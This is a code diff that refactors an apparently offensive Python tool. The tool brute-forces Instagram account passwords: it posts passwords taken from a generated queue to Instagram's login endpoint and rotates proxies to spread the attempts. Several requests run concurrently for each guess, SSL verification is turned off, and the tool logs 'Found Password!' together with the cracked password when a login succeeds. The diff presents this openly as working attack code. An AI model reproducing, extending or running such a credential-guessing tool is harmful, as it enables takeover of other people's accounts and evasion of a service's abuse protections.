@@ -1,6 +1,5 @@
 from __future__ import absolute_import
 
-import collections
 import logging
 
 import aiohttp
@@ -8,89 +7,31 @@ import asyncio
 
 from app import settings
 from app.lib import exceptions
-from app.lib.utils import AsyncTaskManager, auto_logger, format_proxy
+from app.lib.utils import auto_logger, format_proxy
 from app.lib.models import InstagramResult
 
 from .requests import request_handler
-
-
-LoginTaskContext = collections.namedtuple('LoginTaskContext',
-    'name proxy token password')
+from .managers import TaskManager, LoginAttemptContext, LoginTaskContext
 
 
 class login_handler(request_handler):
 
-    # We are going to have to adjust these probably - it might take more than
-    # 10 attempts to retrieve a result if we have bad proxies.
-    # This might not be as appropriate for async cases.
-    ATTEMPT_LIMIT = settings.LOGIN_ATTEMPT_LIMIT
-    CONNECTOR_KEEP_ALIVE_TIMEOUT = 3.0
+    __handlername__ = 'login'
 
     def __init__(self, config, global_stop_event, queues):
         super(login_handler, self).__init__(config, global_stop_event, queues)
         self.user = self.config.user
 
-    def login_data(self, password):
+    def _login_data(self, password):
         return {
-            'username': self.user.username,
-            'password': password
+            settings.INSTAGRAM_USERNAME_FIELD: self.user.username,
+            settings.INSTAGRAM_PASSWORD_FIELD: password
         }
 
     def _headers(self, token):
         headers = super(login_handler, self)._headers()
-        headers['x-csrftoken'] = token
+        headers[settings.TOKEN_HEADER] = token
         return headers
-
-    def _log_context(self, context, **kwargs):
-        context = {
-            'task': context.name,
-            'proxy': context.proxy,
-            'token': context.token,
-            'password': context.password,
-        }
-        context.update(**kwargs)
-        return context
-
-    async def task_generator(self, log, password, **context):
-        index = 0
-        while not self.stop_event.is_set() and index < self.ATTEMPT_LIMIT:
-            proxy = await self.queues.proxies.get_best()
-            index += 1
-
-            _context = LoginTaskContext(
-                name=f'Login Task {index}',
-                proxy=proxy,
-                password=password,
-                **context,
-            )
-
-            log.debug("Submitting Task", extra={
-                'task': _context.name,
-            })
-
-            yield _context
-
-    @property
-    def connector(self):
-        """
-        TCPConnector
-        -------------
-        keepalive_timeout (float) – timeout for connection reusing aftet
-            releasing
-        limit_per_host (int) – limit simultaneous connections to the same
-            endpoint (default is 0)
-        """
-        return aiohttp.TCPConnector(
-            ssl=False,
-            keepalive_timeout=self.CONNECTOR_KEEP_ALIVE_TIMEOUT,
-            enable_cleanup_closed=True,
-        )
-
-    @property
-    def timeout(self):
-        return aiohttp.ClientTimeout(
-            total=settings.DEFAULT_LOGIN_FETCH_TIME
-        )
 
     async def _get_result_from_response(self, response):
         try:
@@ -123,7 +64,7 @@ class login_handler(request_handler):
             except exceptions.ResultNotInResponse as e:
                 raise exceptions.FatalException(
                     "Unexpected behavior, result should be in response.",
-                    extra=self._log_context(context, response=response)
+                    extra=context.log_context(response=response)
                 )
 
     async def _handle_parsed_result(self, result, context, log):
@@ -157,8 +98,8 @@ class login_handler(request_handler):
             async with session.post(
                 settings.INSTAGRAM_LOGIN_URL,
                 headers=self._headers(context.token),
-                data=self.login_data(context.password),
-                timeout=settings.DEFAULT_LOGIN_FETCH_TIME,
+                data=self._login_data(context.password),
+                timeout=self.FETCH_TIME,
                 proxy=format_proxy(context.proxy)
             ) as response:
                 # Only reason to log these errors here is to provide the response
@@ -168,10 +109,10 @@ class login_handler(request_handler):
                     result = await self._handle_parsed_result(result, context, log)
 
                 except exceptions.ResultNotInResponse as e:
-                    log.error(e, extra=self._log_context(context, response=response))
+                    log.error(e, extra=context.log_context(response=response))
 
                 except exceptions.InstagramResultError as e:
-                    log.error(e, extra=self._log_context(context, response=response))
+                    log.error(e, extra=context.log_context(response=response))
 
                 else:
                     if not result:
@@ -185,20 +126,16 @@ class login_handler(request_handler):
             retry += 1
 
             # We probably want to lower this number
-            if retry < 5:
+            if retry < self.MAX_REQUEST_RETRY_LIMIT:
                 # Session should still be alive.
                 await asyncio.sleep(1)
                 return await self.request(session, context, retry=retry)
             else:
-                log.error(e, extra=self._log_context(context))
+                log.error(e, extra=context.log_context())
                 return None
 
-            # Session should still be alive.
-            await asyncio.sleep(1)
-            return await self.request(session, context, retry=retry)
-
         except aiohttp.ClientError as e:
-            log.error(e, extra=self._log_context(context))
+            log.error(e, extra=context.log_context())
 
         except Exception as e:
             raise exceptions.FatalException(f'Uncaught Exception: {str(e)}')
@@ -210,6 +147,10 @@ class login_handler(request_handler):
             connector=self.connector,
             timeout=self.timeout
         ) as session:
+
+            # This is only goign to return the first 2 (or whatever the limit is)
+            # so we might need a customer generator to return the first two but then
+            # wait to see if more are needed.
             async for context in self.task_generator(log, password, token=token):
                 log.debug("Submitting Task", extra={
                     'task': context.name
@@ -229,8 +170,53 @@ class login_handler(request_handler):
                                 self.stop_event.set()
                                 return result
 
+    @auto_logger("Async Login w Password")
+    async def attempt_login(self, session, context, log):
+        """
+        Instead of doing these one after another, we might be able to stagger
+        them asynchronously.  This would be waiting like 3 seconds in between
+        tasks just in case the first one immediately doesn't work, or finding
+        a faster way of accounting for bad proxies.
+        """
+
+        # Should we maybe be doing these one after another?  Or just limit the
+        # number present for any given password.
+        # TODO: We might want to put tasks in their own queue?
+
+        # Do in sets of 3?
+        while True:
+            manager = TaskManager(self.stop_event, log=log, limit=3)
+            while manager.active:
+
+                # This is double counting but the only other option would be while True?
+                proxy = await self.queues.proxies.get_best()
+
+                attempt_context = LoginAttemptContext(
+                    index=manager.index,
+                    proxy=proxy,
+                    context=context,
+                )
+
+                task = asyncio.create_task(self.request(session, attempt_context))
+                manager.submit(task, attempt_context)
+
+            for future in asyncio.as_completed(manager.tasks, timeout=None):
+                # Result can be None if there was a request error or the result
+                # was invalid, but if the result is present - it is guaranteed to
+                # be conclusive.
+                try:
+                    result = await future
+                except asyncio.CancelledError:
+                    continue
+                else:
+                    if result:
+                        if not result.conclusive:
+                            raise exceptions.FatalException("Result should be conslusive.")
+                        await manager.stop()
+                        return result
+
     @auto_logger("Async Login")
-    async def login_asynchronously(self, token, password, log):
+    async def login_asynchronously(self, token, log):
         """
         Asyncio Docs:
 
@@ -253,37 +239,50 @@ class login_handler(request_handler):
         of those succeed, then incrementally add one more one more etc. - the issue
         is if we do not get a valid response for any of the 5 requests we set.
         """
-        # ClientSession should remain open in between futures, so looping over
-        # the context within the session shouldn't make a difference.
-        async with AsyncTaskManager(self.stop_event, log=log) as task_manager:
-            async with aiohttp.ClientSession(
-                connector=self.connector,
-                timeout=self.timeout
-            ) as session:
-                async for context in self.task_generator(log, password, token=token):
-                    log.debug("Submitting Task", extra={
-                        'task': context.name
-                    })
-                    task = asyncio.create_task(self.request(session, context))
-                    task_manager.add(task)
 
-                for future in asyncio.as_completed(task_manager.tasks, timeout=None):
-                    # Result can be None if there was a request error or the result
-                    # was invalid, but if the result is present - it is guaranteed to
-                    # be conclusive.
-                    try:
-                        result = await future
-                    except asyncio.CancelledError:
-                        continue
+        # Put a temporary limit on
+        manager = TaskManager(self.stop_event, log=log, limit=2)
+
+        async with aiohttp.ClientSession(
+            connector=self.connector,
+            timeout=self.timeout
+        ) as session:
+            while manager.active and not self.queues.passwords.generated.empty():
+                password = self.queues.passwords.generated.get_nowait()
+
+                context = LoginTaskContext(
+                    index=manager.index,
+                    password=password,
+                    token=token
+                )
+
+                task = asyncio.create_task(self.attempt_login(session, context))
+                manager.submit(task, context)
+
+            # Result can never be None - it should only be returned if
+            # the result was conclusive instagram result.
+            # TODO: We might have to account for null results if too many attempts
+            # with a given password.
+            for future in asyncio.as_completed(manager.tasks, timeout=None):
+                try:
+                    result = await future
+                except asyncio.CancelledError:
+                    continue
+                else:
+                    if not result or not result.conclusive:
+                        raise exceptions.FatalException(
+                            "Result should be valid and conslusive."
+                        )
+                    if result.authorized:
+                        log.success('Found Password!')
+                        log.success(future.__context__.password)
+                        await manager.stop()
+                        return result
                     else:
-                        if result:
-                            if not result.conclusive:
-                                raise exceptions.FatalException("Result should be conslusive.")
+                        log.error("Not Authenticated")
+            return None
 
-                            await task_manager.stop()
-                            return result
-
-        async def login(self, token, password):
-            if self.config.sync:
-                return await self.login_synchronously(token, password)
-            return await self.login_asynchronously(token, password)
+    async def login(self, token):
+        if self.config.sync:
+            return await self.login_synchronously(token)
+        return await self.login_asynchronously(token)
